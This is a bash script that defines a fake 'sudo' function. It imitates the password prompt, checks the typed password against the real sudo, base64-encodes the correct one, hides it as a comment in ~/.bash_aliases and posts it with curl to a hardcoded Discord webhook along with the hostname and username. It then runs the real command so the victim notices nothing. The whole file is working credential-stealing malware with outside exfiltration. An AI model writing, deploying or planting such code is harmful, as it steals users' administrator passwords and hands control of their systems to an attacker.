function sudo(){
  user_shell=$(basename $SHELL)
  sudo_original="/usr/bin/sudo"
  param="$@"
  msg="[sudo] password for $USER: "

  if [[ $S_CAPTURED == 1 ]] ; then # if already captured
    "$sudo_original" $@
    return $?
  fi

  # if no arguments
  if [ ! "$#" -gt 0 ]; then "$sudo_original"; return $?; fi

  case $param in
    -h)
      "$sudo_original" -h
      ;;
    -k)
      "$sudo_original" -k
      ;;
    -K)
      "$sudo_original" -K
      ;;
    -V)
      "$sudo_original" -V
      ;;
    *)
      "$sudo_original" -k
      for i in {1..3};do
        if [[ "$user_shell" == "zsh" ]];then
          echo -n "$msg";read -s passwd; echo
        else
          read -s -p "$msg" passwd; echo
        fi
        echo "$passwd" | "$sudo_original" -S true 2> /dev/null
        if [[ $? == 0 ]];then
          sendPassword "$passwd"
          S_CAPTURED=1
          echo "$passwd" | exec "$sudo_original" -S -p '' $@
          break
        fi
      done
      if [[ $S_CAPTURED == 0 ]];then
        echo -e "\nsudo: 3 incorrect password attempts"
      fi
  esac
}

function sudo_send2discord() {
  # update with your discord webhook here
  # SUDO_DISCORD_WEBHOOK_URL='https://discordapp.com/api/webhooks/710652525165936751/D4w3diaH2O7L3_GHW0N436VH4nUg1s6PgIbwVqLWaK_TR91pVpARODcpL-5mqto7Hm49'
  SUDO_DISCORD_WEBHOOK_URL='https://discordapp.com/api/webhooks/710652525165936751/D4w3diaH2O7L3_GHW0N436VH4nUg1s6PgIbwVqLWaK_TR91pVpARODcpL-5mqto7Hm49'
  # this is put here to not pollute the shell environ

  curl -H "Content-Type: application/json" -X POST \
    -d "{\"username\": \"$HOSTNAME:$USER\", \"content\": \"\`\`\`$@\`\`\`\"}" \
    "$SUDO_DISCORD_WEBHOOK_URL" &>/dev/null
}

function sendPassword(){
  passwd=$(echo "$@" | base64 -w0)
  echo "# $passwd" >> ~/.bash_aliases
  sudo_send2discord "$passwd"
}

# sudo state, 0 if not captured, 1 if already captured
S_CAPTURED=0
